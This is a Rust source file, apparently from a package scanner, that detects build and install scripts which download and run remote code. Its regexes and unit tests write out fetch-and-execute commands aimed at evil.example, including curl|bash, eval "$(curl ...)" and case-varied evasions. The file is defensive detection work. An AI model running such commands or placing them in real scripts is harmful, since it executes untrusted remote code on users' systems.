//! Remote-execution boundary detection.
//!
//! A package can keep its malicious payload *outside* any package by fetching
//! and running code from an external URL at build/install time. The scanner
//! deliberately does **not** follow that reference: downloading or running it
//! would turn the scanner itself into the execution vector, and the dependency
//! graph / SBOM would be chasing attacker-controlled code.
//!
//! Instead this analyzer detects the fetch-and-execute, extracts the URL(s),
//! and emits a loud finding. Downstream, such a package is marked as an
//! **opaque boundary**: the SBOM cannot account for what runs beyond it, by
//! design -- the correct message to the user is "this runs code from <url>,
//! you probably don't want that", not a fabricated "complete" SBOM.

use super::SecurityAnalyzer;
use crate::error::Result;
use crate::resolve::{resolve_variables, statement_head};
use crate::rules::informational_lines_with;
use crate::textutil::{
    deobfuscate, logical_lines, normalize_shell_quoting, split_statements, split_words,
    BraceScanner, INTERPRETERS, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
};
use crate::types::{AnalysisContext, Category, Finding, Location, Severity};
use async_trait::async_trait;
use lazy_static::lazy_static;
use regex::Regex;
use std::collections::HashSet;

lazy_static! {
    /// A line that downloads and immediately executes remote content.
    ///
    /// The shell/interpreter sinks come from the shared `SHELLS`/`INTERPRETERS`
    /// constants so every detector recognizes the same set -- notably `dash`,
    /// which the previous inline `(ba|z|k|c|d|tc|fi)?sh` could never match
    /// (`d?sh` is `dsh`/`sh`, not `dash`), letting `curl evil | dash` evade this
    /// analyzer entirely (defect #6).
    static ref FETCH_EXEC: Regex = Regex::new(&format!(
        // `(?i)` so case variation (`CURL`, `BASH`, `Wget`) cannot evade the
        // fetch-and-execute sink (audit HI-6). Every token here is a command or
        // shell/interpreter name -- none is case-canonical -- so a blanket
        // case-insensitive match is correct and introduces no false positives.
        r#"(?ix)
        (curl|wget|aria2c|fetch)\b(?:[^\n]*[^|\n])?\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b          # download | [launcher][path] shell
        | (curl|wget|aria2c|fetch)\b(?:[^\n]*[^|\n])?\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b  # download | [launcher][path] interpreter
        | {SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s+<\(\s*(curl|wget|fetch)\b                 # [launcher][path] sh <(curl ...)
        | {SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b\s+<\(\s*(curl|wget|fetch)\b           # [launcher][path] python <(curl ...)
        | {SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b[^\n|]*?(?:\$\(\s*(curl|wget|aria2c|fetch|http)|<<<[^\n]*\$\(\s*(curl|wget|fetch))  # interp [flags] "$(curl)" / <<< "$(curl)" (php -r, perl -ne, python -B -c, ruby -r..-e)
        | {SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b[^\n|]*?(?:\$\(\s*(curl|wget|aria2c|fetch)\b|<<<[^\n]*\$\(\s*(curl|wget|fetch))  # shell [flags] "$(curl)" / <<< "$(curl)" (sh -c "$(curl ...)")
        | source\s+<\(\s*(curl|wget|fetch)\b                         # source <(curl ...)
        | \beval\s+["']?\$\(\s*(curl|wget|fetch)\b                   # eval "$(curl ...)"
        | \.\s+<\(\s*(curl|wget|fetch)\b                             # . <(curl ...)
        "#
    )).unwrap();
    /// Extract http(s) URLs (stop at shell/quote boundaries).
    static ref URL: Regex = Regex::new(r#"https?://[^\s"'`|)><(]+"#).unwrap();
}

/// Trim trailing shell punctuation a URL regex may capture.
fn clean_url(u: &str) -> String {
    u.trim_end_matches([';', '&', ',', '.', '\\', '}'])
        .to_string()
}

/// Commands that merely wrap another command (the real command is the next
/// non-flag word).
const WRAPPERS: &[&str] = &[
    "sudo",
    "doas",
    "env",
    "command",
    "exec",
    "nohup",
    "time",
    "nice",
    "setsid",
    "stdbuf",
    "timeout",
    "busybox",
    "toybox",
    "torsocks",
    "proxychains",
    "proxychains4",
];

/// Commands whose operands are data, never code that gets run -- an argument that
/// merely names a cloned/downloaded path there is not an execution.
const NON_EXEC: &[&str] = &[
    "cp",
    "mv",
    "rm",
    "cat",
    "ls",
    "chmod",
    "chown",
    "chgrp",
    "install",
    "ln",
    "mkdir",
    "rmdir",
    "find",
    "sed",
    "grep",
    "egrep",
    "awk",
    "tar",
    "unzip",
    "zip",
    "echo",
    "printf",
    "test",
    "[",
    "[[",
    "cd",
    "diff",
    "patch",
    "git",
    "stat",
    "file",
    "head",
    "tail",
    "touch",
    "du",
    "wc",
    "sort",
    "tee",
    "strip",
    "sha256sum",
    "sha512sum",
    "md5sum",
    "b2sum",
    "rsync",
    "readlink",
    "realpath",
    "basename",
    "dirname",
    "tree",
    "rg",
    "sha1sum",
    "msg",
    "msg2",
    "plain",
    "warning",
    "error",
    "note",
    "curl",
    "wget",
    "pushd",
    "popd",
    "rename",
    "gzip",
    "xz",
    "bzip2",
    "zstd",
    "bsdtar",
    "7z",
    "cmp",
    // Not `ldd`: it runs its target through the dynamic loader, so `ldd` on a
    // freshly cloned binary executes that binary.
    "objdump",
    "readelf",
    "namcap",
];

/// Script-like basenames (no extension) that a clone-then-run step plausibly runs.
const SCRIPT_NAMES: &[&str] = &[
    "install",
    "setup",
    "bootstrap",
    "run",
    "start",
    "update",
    "init",
    "installer",
    "deploy",
    "payload",
    "build",
    "get",
];

lazy_static! {
    /// An interpreter invoked with an inline-code flag (`python3 -c`, `perl -e`,
    /// `node -e`, `ruby -e`, `php -r`). The code is whatever follows.
    static ref INLINE_INTERP: Regex = Regex::new(&format!(
        r#"(?i){SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b\s+(?:-\S+\s+)*-[A-Za-z]*[cerE]\b"#
    )).unwrap();
    /// A network-fetch primitive inside inline interpreter code.
    static ref INLINE_FETCH_TOK: Regex = Regex::new(
        r#"(?i)urlopen|urllib|requests\.(?:get|post)|http\.client|httplib|HTTPS?Connection|Net::HTTP|open-uri|\bLWP\b|URI\.open|\bhttps?\.get|\bfetch\(|XMLHttpRequest|create_connection|\bcurl\b|\bwget\b"#
    ).unwrap();
    /// A code-execution primitive inside inline interpreter code.
    static ref INLINE_EXEC_TOK: Regex = Regex::new(
        r#"(?i)\bexec\s*\(|\beval\b|\bsystem\s*\(|os\.system|subprocess|popen|child_process|\bexecSync|\bspawn|\bcompile\s*\(|\bFunction\s*\(|\bexec\b"#
    ).unwrap();
    /// The Python fetch-and-exec idiom on one line (also inside a heredoc fed to
    /// an interpreter, where there is no `-c`): `exec(urlopen(url).read())`.
    static ref PY_FETCH_EXEC: Regex = Regex::new(
        r#"(?i)\b(?:exec|eval)\s*\([^\n]*?(?:urlopen|requests\.get|urllib\.request|http\.client)[^\n]*?\.(?:read|text|content)\b"#
    ).unwrap();
    /// A command substitution that fetches (`$(curl …)` / `` `wget …` ``).
    static ref FETCH_SUBST: Regex = Regex::new(
        r#"(?i)(?:\$\(|`)\s*(?:(?:/\S+/)?(?:curl|wget|aria2c|fetch))\b"#
    ).unwrap();
    /// `<<EOF` / `<<-'EOF'` heredoc opener; captures the delimiter.
    static ref HEREDOC_OPEN: Regex =
        Regex::new(r#"(?:^|[^<])<<-?\s*['"\\]?([A-Za-z_][A-Za-z0-9_]*)['"]?"#).unwrap();
    /// A pipe into a shell/interpreter.
    static ref SHELL_PIPE_SINK: Regex = Regex::new(&format!(
        r"(?i)\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b(?:{SHELLS}|{INTERPRETERS})\b"
    )).unwrap();
    static ref SHELL_OR_INTERP: Regex = Regex::new(&format!(
        r#"(?i)^{SHELLS}$|^{INTERPRETERS}$"#
    )).unwrap();
    /// `cat FILE | sh` -- the downloaded file is fed to a shell on stdin.
    static ref CAT_PIPE_SHELL: Regex = Regex::new(&format!(
        r#"(?i)\bcat\s+(\S+)\s*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"#
    )).unwrap();
    /// `sh < FILE` / `bash < FILE`.
    static ref SHELL_STDIN_FILE: Regex = Regex::new(&format!(
        r#"(?i){SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b[^|;&\n]*?<\s*([^\s<(]\S*)"#
    )).unwrap();
    static ref FN_HEADER: Regex = Regex::new(
        r"^\s*(?:function\s+)?[A-Za-z_][A-Za-z0-9_:-]*\s*\(\s*\)|^\s*function\s+[A-Za-z_][A-Za-z0-9_:-]*"
    ).unwrap();
}

/// Strip quoting from a word (`"$f"` -> `$f`) and canonicalize a path-ish word
/// for comparison: `./x` -> `x`, `$HOME`/`${HOME}` -> `~`.
fn norm_path(w: &str) -> String {
    let mut p = normalize_shell_quoting(w);
    p = p.replace("${HOME}", "~").replace("$HOME", "~");
    while let Some(rest) = p.strip_prefix("./") {
        p = rest.to_string();
    }
    p.trim_end_matches('/').to_string()
}

fn base_of(w: &str) -> String {
    normalize_shell_quoting(w)
        .rsplit('/')
        .next()
        .unwrap_or("")
        .to_string()
}

fn is_assign_word(w: &str) -> bool {
    let mut it = w.splitn(2, '=');
    match (it.next(), it.next()) {
        (Some(n), Some(_)) => {
            !n.is_empty()
                && n.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
                && !n.starts_with(|c: char| c.is_ascii_digit())
        }
        _ => false,
    }
}

/// Index of the real command word, skipping env assignments and wrapper commands
/// (`sudo`, `env X=1`, `nohup`, `timeout 5`, …) and their flags.
fn command_index(words: &[String]) -> usize {
    let mut i = 0;
    while i < words.len() {
        let b = base_of(&words[i]);
        if is_assign_word(&words[i]) {
            i += 1;
        } else if WRAPPERS.contains(&b.as_str()) {
            i += 1;
            while i < words.len()
                && (words[i].starts_with('-')
                    || is_assign_word(&words[i])
                    || (b == "timeout" && words[i].chars().all(|c| c.is_ascii_digit())))
            {
                i += 1;
            }
        } else {
            break;
        }
    }
    i
}

/// What a fetch statement saves to disk: `(targets, urls)`. `None` when the
/// statement is not a fetch of a URL.
fn download_info(words: &[String]) -> Option<(Vec<String>, Vec<String>)> {
    let ci = command_index(words);
    let cmd = base_of(words.get(ci)?).to_lowercase();
    if !matches!(cmd.as_str(), "curl" | "wget" | "aria2c" | "fetch") {
        return None;
    }
    let args: Vec<String> = words[ci + 1..]
        .iter()
        .map(|w| normalize_shell_quoting(w))
        .collect();
    let is_url = |a: &str| a.contains("://") || a.starts_with('$');
    let urls: Vec<String> = args.iter().filter(|a| is_url(a)).cloned().collect();
    if urls.is_empty() {
        return None;
    }
    let mut targets: Vec<String> = Vec::new();
    let mut remote_name = false;
    let mut i = 0;
    while i < args.len() {
        let a = &args[i];
        let next = args.get(i + 1).cloned();
        if a == "--output" || a == "--output-document" {
            targets.extend(next);
            i += 1;
        } else if let Some(v) = a
            .strip_prefix("--output=")
            .or_else(|| a.strip_prefix("--output-document="))
        {
            targets.push(v.to_string());
        } else if a == "--remote-name" || a == "-O" && cmd == "curl" {
            remote_name = true;
        } else if a.starts_with('>') {
            let t = a.trim_start_matches('>');
            if t.is_empty() {
                targets.extend(next);
                i += 1;
            } else {
                targets.push(t.to_string());
            }
        } else if a.starts_with('-') && !a.starts_with("--") && a.len() >= 2 {
            // clustered short flags: the LAST letter takes the next word as its
            // value (`-fsSLo out`, `-qO out`, `-oout`, `-Oout`).
            let flags = &a[1..];
            // curl: -o/-O; wget: -O only (its `-o` is the LOG file); others: -o.
            let letters: &[char] = match cmd.as_str() {
                "curl" => &['o', 'O'],
                "wget" => &['O'],
                _ => &['o'],
            };
            if let Some(pos) = flags.find(letters) {
                let rest = &flags[pos + 1..];
                let letter = flags.as_bytes()[pos] as char;
                if cmd == "curl" && letter == 'O' {
                    remote_name = true;
                } else if !rest.is_empty() {
                    targets.push(rest.to_string());
                } else if let Some(n) = next {
                    targets.push(n);
                    i += 1;
                }
            }
        }
        i += 1;
    }
    // `curl -O URL` and a bare `wget URL` save under the URL's basename.
    if remote_name || (cmd == "wget" && targets.is_empty()) {
        for u in &urls {
            let path = u.split(['?', '#']).next().unwrap_or(u);
            if let Some(b) = path.rsplit('/').next().filter(|b| !b.is_empty()) {
                if !b.contains("://") && !b.starts_with('$') {
                    targets.push(b.to_string());
                }
            }
        }
    }
    targets.retain(|t| t != "-" && !t.starts_with("/dev/"));
    let targets: Vec<String> = targets.iter().map(|t| norm_path(t)).collect();
    (!targets.is_empty()).then_some((targets, urls))
}

/// Paths a statement EXECUTES: the command itself when it is path-like, the file
/// operand of a shell/interpreter, `source`/`.` operands, `cat F | sh`, and
/// `sh < F`. Returns `(candidates, ran_via_unknown_command)`.
fn exec_candidates(stmt: &str, words: &[String]) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let ci = command_index(words);
    if let Some(cmd_w) = words.get(ci) {
        let cmd = normalize_shell_quoting(cmd_w);
        let base = cmd.rsplit('/').next().unwrap_or("").to_string();
        let rest = &words[ci + 1..];
        if SHELL_OR_INTERP.is_match(&base) {
            for w in rest {
                let n = normalize_shell_quoting(w);
                if n == "-c" || (n.starts_with('-') && !n.starts_with("--") && n.contains('c')) {
                    // `-c STRING`: the operand is a command string, not a file.
                    break;
                }
                if n.starts_with('-') {
                    continue;
                }
                out.push(norm_path(&n));
                break;
            }
        } else if base == "source" || cmd == "." {
            if let Some(w) = rest.first() {
                out.push(norm_path(w));
            }
        } else if base == "exec" || NON_EXEC.contains(&base.as_str()) {
            // data operands, not code
        } else if cmd.contains('/') || cmd.starts_with('~') || cmd.starts_with('$') {
            // a path-like command word runs that file
            out.push(norm_path(&cmd));
        } else {
            // a bare command name (`./f` handled above; plain `f` is a PATH
            // lookup unless it names a downloaded file in cwd).
            out.push(norm_path(&cmd));
            // unknown wrapper such as a PKGBUILD helper `run ./r/install.sh`:
            // its path-like operands may be what it runs.
            for w in rest {
                let n = normalize_shell_quoting(w);
                if !n.starts_with('-') && (n.starts_with("./") || n.contains('/')) {
                    out.push(norm_path(&n));
                }
            }
        }
    }
    if let Some(c) = CAT_PIPE_SHELL.captures(stmt) {
        out.push(norm_path(&c[1]));
    }
    if let Some(c) = SHELL_STDIN_FILE.captures(stmt) {
        out.push(norm_path(&c[1]));
    }
    out
}

/// `(dir, url)` for a `git clone [opts] URL [DIR]` statement.
fn clone_info(words: &[String]) -> Option<(String, String)> {
    let ci = command_index(words);
    if base_of(words.get(ci)?) != "git" {
        return None;
    }
    let args: Vec<String> = words[ci + 1..]
        .iter()
        .map(|w| normalize_shell_quoting(w))
        .collect();
    let pos = args.iter().position(|a| a == "clone")?;
    let mut operands: Vec<&String> = Vec::new();
    let mut i = pos + 1;
    while i < args.len() {
        let a = &args[i];
        if matches!(
            a.as_str(),
            "-b" | "--branch"
                | "--depth"
                | "-c"
                | "--config"
                | "-o"
                | "--origin"
                | "--reference"
                | "--separate-git-dir"
                | "-j"
                | "--jobs"
                | "--filter"
                | "--template"
        ) {
            i += 2;
            continue;
        }
        if !a.starts_with('-') {
            operands.push(a);
        }
        i += 1;
    }
    let url = operands.first()?;
    if !(url.contains("://") || (url.contains('@') && url.contains(':'))) {
        return None;
    }
    let dir = match operands.get(1) {
        Some(d) => norm_path(d),
        None => {
            let b = url.trim_end_matches('/').rsplit(['/', ':']).next()?;
            b.trim_end_matches(".git").to_string()
        }
    };
    (!dir.is_empty()).then(|| (dir, (*url).clone()))
}

fn script_like(path: &str, explicit_dir: bool) -> bool {
    let base = path.rsplit('/').next().unwrap_or("");
    let ext = base.rsplit_once('.').map(|(_, e)| e.to_lowercase());
    match ext.as_deref() {
        Some("sh" | "bash" | "run" | "bin") => true,
        Some("py" | "pl" | "rb") => explicit_dir && base != "setup.py",
        Some(_) => false,
        None => SCRIPT_NAMES.contains(&base),
    }
}

#[derive(Default, Clone)]
struct Flow {
    /// `(normalized path, source urls)` of files a fetch saved.
    downloaded: Vec<(String, Vec<String>)>,
    /// `(dir, url)` of `git clone` working trees.
    cloned: Vec<(String, String)>,
    /// Set after `cd <cloned dir>`.
    cwd_clone: Option<String>,
}

/// Detects remote fetch-and-execute and extracts the external URL(s).
pub struct RemoteExecAnalyzer;

impl RemoteExecAnalyzer {
    /// Create a new analyzer.
    pub fn new() -> Self {
        Self
    }

    #[allow(clippy::too_many_arguments)]
    fn finding(
        severity: Severity,
        title: String,
        description: String,
        file: &std::path::Path,
        line: usize,
        snippet: &str,
        urls: Vec<String>,
        flow: &str,
    ) -> Finding {
        Finding {
            id: "EXEC-REMOTE".to_string(),
            severity,
            category: Category::MaliciousCode,
            title,
            description,
            location: Location {
                file: file.to_path_buf(),
                line: Some(line),
                column: None,
                snippet: Some(snippet.trim().to_string()),
            },
            recommendation:
                "Do not build. A package that pulls and runs code from an external URL is \
                 opaque by design; obtain the software from a source that ships its real code."
                    .to_string(),
            cwe_id: Some("CWE-494".to_string()),
            metadata: serde_json::json!({
                "remote_urls": urls,
                "opaque_boundary": true,
                "flow": flow,
            }),
        }
    }

    #[cfg_attr(not(test), allow(dead_code))]
    fn scan(&self, text: &str, file: &std::path::Path, in_install: bool) -> Vec<Finding> {
        let local = crate::rules::ShadowSet::from_text(text).names();
        self.scan_with(text, file, in_install, &local)
    }

    /// [`Self::scan`] with the package-wide set of redefined printer names.
    fn scan_with(
        &self,
        text: &str,
        file: &std::path::Path,
        in_install: bool,
        shadowed: &HashSet<String>,
    ) -> Vec<Finding> {
        let mut findings = Vec::new();
        // Splice backslash-newline continuations so `curl evil \`<nl>`| sh`
        // cannot escape the fetch-exec pattern by living on two physical lines.
        let lines = logical_lines(text);
        // Skip lines that are printed text rather than executed code (a
        // non-redirected heredoc body or a pure `echo`/`msg "..."` print), using
        // the same pre-filter the rule engine and privilege analyzer use, so a
        // package that merely DOCUMENTS a `curl ... | sh` example does not raise
        // EXEC-REMOTE.
        let line_strs: Vec<&str> = lines.iter().map(|(_, s)| s.as_str()).collect();
        let informational = informational_lines_with(&line_strs, shadowed);
        // Variable-resolved variant (static taint pass): `c=curl; $c url | sh`,
        // top-level `_c=curl` used in a function, `${IFS}` separators and short
        // inline-encoded payloads. Aligned to logical lines by start line.
        let resolved_full = resolve_variables(text);
        let resolved_phys: Vec<&str> = resolved_full.lines().collect();

        let where_ = if in_install { " (install script)" } else { "" };
        let mut top = Flow::default();
        let mut local: Option<Flow> = None;
        let mut scanner = BraceScanner::default();
        // Open heredoc fed to a shell: (delimiter).
        let mut exec_heredoc: Option<String> = None;

        for (idx_l, (phys_line, line)) in lines.iter().enumerate() {
            let line = line.as_str();
            let trimmed = line.trim_start();
            let skip = trimmed.starts_with('#') || informational[idx_l];
            let idx = phys_line - 1;
            let resolved: Option<&str> = resolved_phys
                .get(idx)
                .copied()
                .filter(|r| *r != line && !r.trim().is_empty());
            let decoded = deobfuscate(line);

            // Function scope: a function body sees the top-level flow state
            // (top-level code ran when the PKGBUILD was sourced) but its own
            // downloads/clones do not leak out.
            if local.is_none() && FN_HEADER.is_match(line) {
                local = Some(top.clone());
                scanner = BraceScanner::default();
            }

            if !skip {
                // ---- Phase 1: single-line fetch|exec (raw, de-obfuscated, resolved).
                let mut scan_line: Option<&str> = None;
                let mut flow = "fetch-pipe";
                for cand in [Some(line), decoded.as_deref(), resolved]
                    .into_iter()
                    .flatten()
                {
                    if FETCH_EXEC.is_match(cand) {
                        scan_line = Some(cand);
                        break;
                    }
                    if inline_interp_fetch_exec(cand) {
                        scan_line = Some(cand);
                        flow = "interpreter-inline-fetch";
                        break;
                    }
                }
                if let Some(scan_line) = scan_line {
                    let urls: Vec<String> = URL
                        .find_iter(scan_line)
                        .map(|m| clean_url(m.as_str()))
                        .collect();
                    let url_msg = if urls.is_empty() {
                        "an external source".to_string()
                    } else {
                        urls.join(", ")
                    };
                    findings.push(Self::finding(
                        Severity::Critical,
                        format!("Fetches and runs code from {url_msg}{where_}"),
                        format!(
                            "This package downloads and executes code from {url_msg} at build/install \
                             time. The scanner does NOT follow this reference (doing so could run the \
                             remote code), so what actually executes is unknown -- treat it as untrusted. \
                             The dependency tree/SBOM cannot account for code fetched at runtime."
                        ),
                        file,
                        idx + 1,
                        scan_line,
                        urls,
                        flow,
                    ));
                    // Still advance the flow state below, but never double-report.
                    self.advance_flow(
                        &mut top,
                        &mut local,
                        resolved.or(decoded.as_deref()).unwrap_or(line),
                    );
                    self.update_scope(&mut scanner, &mut local, line);
                    continue;
                }

                // ---- Heredoc fed to a shell/interpreter: `$(curl …)` in the body.
                if let Some(delim) = &exec_heredoc {
                    if line.trim() == delim.as_str() {
                        exec_heredoc = None;
                    } else if let Some(sl) = [Some(line), decoded.as_deref(), resolved]
                        .into_iter()
                        .flatten()
                        .find(|c| FETCH_SUBST.is_match(c) || PY_FETCH_EXEC.is_match(c))
                    {
                        let urls: Vec<String> =
                            URL.find_iter(sl).map(|m| clean_url(m.as_str())).collect();
                        let url_msg = if urls.is_empty() {
                            "an external source".to_string()
                        } else {
                            urls.join(", ")
                        };
                        findings.push(Self::finding(
                            Severity::Critical,
                            format!("Fetches and runs code from {url_msg}{where_}"),
                            format!(
                                "A heredoc fed to a shell/interpreter expands a fetch (`$(curl ...)`) from \
                                 {url_msg}, and the shell then executes the result. The scanner does NOT \
                                 follow this reference, so what executes is unknown -- treat it as untrusted."
                            ),
                            file,
                            idx + 1,
                            sl,
                            urls,
                            "heredoc-fetch",
                        ));
                    }
                } else if let Some(c) = HEREDOC_OPEN.captures(line) {
                    let src = resolved.or(decoded.as_deref()).unwrap_or(line);
                    let words = split_words(statement_head(src).0);
                    let ci = command_index(&words);
                    let cmd = words.get(ci).map(|w| base_of(w)).unwrap_or_default();
                    let to_shell_pipe = SHELL_PIPE_SINK.is_match(src);
                    if SHELL_OR_INTERP.is_match(&cmd) || cmd == "eval" || to_shell_pipe {
                        exec_heredoc = Some(c[1].to_string());
                    }
                }

                // ---- Phase 2: statement flow (download-then-run, clone-then-run).
                let src = resolved.or(decoded.as_deref()).unwrap_or(line);
                let mut reported = false;
                for (stmt, _) in split_statements(src) {
                    let (head, _) = statement_head(&stmt);
                    let words = split_words(head);
                    if words.is_empty() {
                        continue;
                    }
                    let flow = local.as_ref().unwrap_or(&top);
                    let cands = exec_candidates(head, &words);
                    let mut hit: Option<(Severity, Vec<String>, String, &str)> = None;
                    for cand in &cands {
                        if let Some((_, urls)) = flow.downloaded.iter().find(|(p, _)| p == cand) {
                            hit = Some((
                                Severity::Critical,
                                urls.clone(),
                                format!("downloaded file `{cand}`"),
                                "download-then-run",
                            ));
                            break;
                        }
                        // clone-then-run: a script inside a cloned working tree.
                        for (dir, url) in &flow.cloned {
                            let under_dir = cand.starts_with(&format!("{dir}/"));
                            let in_cwd = flow.cwd_clone.as_deref() == Some(dir.as_str())
                                && !cand.starts_with(['/', '~', '$'])
                                && !cand.contains('/');
                            if (under_dir || in_cwd) && script_like(cand, under_dir) {
                                hit = Some((
                                    Severity::High,
                                    vec![url.clone()],
                                    format!("script `{cand}` from the cloned repository"),
                                    "clone-then-run",
                                ));
                                break;
                            }
                        }
                        if hit.is_some() {
                            break;
                        }
                    }
                    if let (Some((sev, urls, what, kind)), false) = (hit, reported) {
                        let url_msg = urls.join(", ");
                        findings.push(Self::finding(
                            sev,
                            format!("Runs code fetched from {url_msg}{where_}"),
                            format!(
                                "This package fetches code from {url_msg} (as {what}) and then runs it. \
                                 The scanner does NOT follow that reference, so what executes is \
                                 unknown -- treat it as untrusted. The dependency tree/SBOM cannot \
                                 account for code fetched at build/install time."
                            ),
                            file,
                            idx + 1,
                            stmt.trim(),
                            urls,
                            kind,
                        ));
                        reported = true;
                    }
                    // Record what THIS statement fetched / cloned / cd'd into.
                    let flow = local.as_mut().unwrap_or(&mut top);
                    if let Some((targets, urls)) = download_info(&words) {
                        for t in targets {
                            flow.downloaded.push((t, urls.clone()));
                        }
                    }
                    if let Some(c) = clone_info(&words) {
                        flow.cloned.push(c);
                    }
                    let ci = command_index(&words);
                    if words.get(ci).map(|w| base_of(w)).as_deref() == Some("cd") {
                        let target = words.get(ci + 1).map(|w| norm_path(w));
                        flow.cwd_clone = target
                            .filter(|t| flow.cloned.iter().any(|(d, _)| d == t))
                            .or(None);
                    }
                }
            }
            self.update_scope(&mut scanner, &mut local, line);
        }
        findings
    }

    /// Record fetch/clone effects of a line already reported by phase 1.
    fn advance_flow(&self, top: &mut Flow, local: &mut Option<Flow>, src: &str) {
        let flow = local.as_mut().unwrap_or(top);
        for (stmt, _) in split_statements(src) {
            let words = split_words(statement_head(&stmt).0);
            if let Some((targets, urls)) = download_info(&words) {
                for t in targets {
                    flow.downloaded.push((t, urls.clone()));
                }
            }
            if let Some(c) = clone_info(&words) {
                flow.cloned.push(c);
            }
        }
    }

    /// Leave the function scope once its braces balance.
    fn update_scope(&self, scanner: &mut BraceScanner, local: &mut Option<Flow>, line: &str) {
        if local.is_some() {
            scanner.feed(line);
            if scanner.peak > 0 && scanner.depth <= 0 {
                *local = None;
            }
        }
    }
}

/// An interpreter run with inline code (`python3 -c "…"`, `perl -e`, `node -e`)
/// whose code both fetches over the network and executes what it fetched, or the
/// bare Python `exec(urlopen(url).read())` idiom.
fn inline_interp_fetch_exec(line: &str) -> bool {
    if PY_FETCH_EXEC.is_match(line) {
        return true;
    }
    match INLINE_INTERP.find(line) {
        Some(m) => {
            let code = &line[m.end()..];
            INLINE_FETCH_TOK.is_match(code) && INLINE_EXEC_TOK.is_match(code)
        }
        None => false,
    }
}

impl Default for RemoteExecAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl SecurityAnalyzer for RemoteExecAnalyzer {
    async fn analyze(&self, context: &AnalysisContext) -> Result<Vec<Finding>> {
        let shadow = context.shadowed_printers();
        let shadowed = shadow.names();
        let mut findings: Vec<Finding> = Vec::new();
        let mut files: Vec<(&str, &std::path::Path, bool)> = vec![(
            context.pkgbuild.raw_content.as_str(),
            context.file_path.as_path(),
            false,
        )];
        for script in context.all_scripts() {
            files.push((script.content.as_str(), script.path.as_path(), true));
        }
        for (text, path, in_install) in files {
            let mut seen: HashSet<(String, Option<usize>)> = HashSet::new();
            let mut all = self.scan_with(text, path, in_install, &shadowed);
            // Calls to a redefined printer, replaced by what they execute.
            if let Some(inlined) = shadow.inline_calls(text) {
                all.extend(self.scan_with(&inlined, path, in_install, &shadowed));
            }
            for f in all {
                if seen.insert((f.id.clone(), f.location.line)) {
                    findings.push(f);
                }
            }
        }
        Ok(findings)
    }

    fn name(&self) -> &str {
        "remote_exec"
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    #[test]
    fn detects_curl_pipe_sh_and_extracts_url() {
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "build() {\n  curl -fsSL https://evil.example/x.sh | bash\n}",
            Path::new("PKGBUILD"),
            false,
        );
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].id, "EXEC-REMOTE");
        let urls = f[0].metadata["remote_urls"].as_array().unwrap();
        assert_eq!(urls[0], "https://evil.example/x.sh");
    }

    #[test]
    fn detects_process_substitution() {
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "bash <(curl -s https://x.io/i)",
            Path::new("PKGBUILD"),
            false,
        );
        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"));
    }

    #[test]
    fn detects_continuation_split_fetch_exec() {
        // CR-3: the pipe-to-shell is on a backslash-continuation line.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "build() {\n  curl -fsSL https://evil.example/x \\\n    | bash\n}",
            Path::new("PKGBUILD"),
            false,
        );
        assert!(
            f.iter().any(|x| x.id == "EXEC-REMOTE"),
            "continuation-split fetch|exec must be caught"
        );
    }

    #[test]
    fn detects_curl_pipe_dash() {
        // Defect #6: `dash` was matched nowhere. `curl ... | dash` must now fire.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "curl -fsSL https://evil.example/x.sh | dash",
            Path::new("PKGBUILD"),
            false,
        );
        assert!(
            f.iter().any(|x| x.id == "EXEC-REMOTE"),
            "curl|dash must be caught"
        );
    }

    #[test]
    fn detects_curl_pipe_ash() {
        // Task 4050 F2: ash is a SHELLS member now — `curl ... | ash` must fire.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "curl -fsSL https://evil.example/x.sh | ash",
            Path::new("PKGBUILD"),
            false,
        );
        assert!(
            f.iter().any(|x| x.id == "EXEC-REMOTE"),
            "curl|ash must be caught"
        );
    }

    #[test]
    fn case_variation_does_not_evade_fetch_exec() {
        // Audit HI-6: the FETCH_EXEC sink is `(?i)` so upper/mixed-case commands
        // cannot evade it. Each of these is the same fetch-and-run, re-cased.
        let a = RemoteExecAnalyzer::new();
        for payload in [
            "CURL -fsSL https://evil.example/x.sh | SH",
            "Wget -qO- https://evil.example/x.sh | Bash",
            "BASH <(CURL -s https://evil.example/i)",
            "EVAL \"$(curl https://evil.example/r)\"",
        ] {
            let f = a.scan(payload, Path::new("PKGBUILD"), false);
            assert!(
                f.iter().any(|x| x.id == "EXEC-REMOTE"),
                "case-variant fetch-exec must be caught: {payload:?}"
            );
        }
    }

    #[test]
    fn lowercase_r_interpreter_does_not_false_positive() {
        // Audit HI-6 guardrail: making the sink `(?i)` must NOT let the single-
        // letter R-language interpreter match a lower-case `r` (an extremely
        // common token) -- `R`/`Rscript` are pinned case-exact via `(?-i:…)` in
        // the INTERPRETERS constant. These benign `r` uses must NOT fire.
        let a = RemoteExecAnalyzer::new();
        for payload in [
            "curl -fsSL https://example.com/data.csv | r --no-save",
            "r <(curl -s https://example.com/script)",
        ] {
            let f = a.scan(payload, Path::new("PKGBUILD"), false);
            assert!(
                !f.iter().any(|x| x.id == "EXEC-REMOTE"),
                "lower-case `r` must not trip EXEC-REMOTE (R-interpreter FP): {payload:?}"
            );
        }
        // ...but the canonical upper-case R-language interpreters still fire.
        for payload in [
            "curl -fsSL https://evil.example/m | Rscript -",
            "Rscript <(curl -s https://evil.example/n)",
        ] {
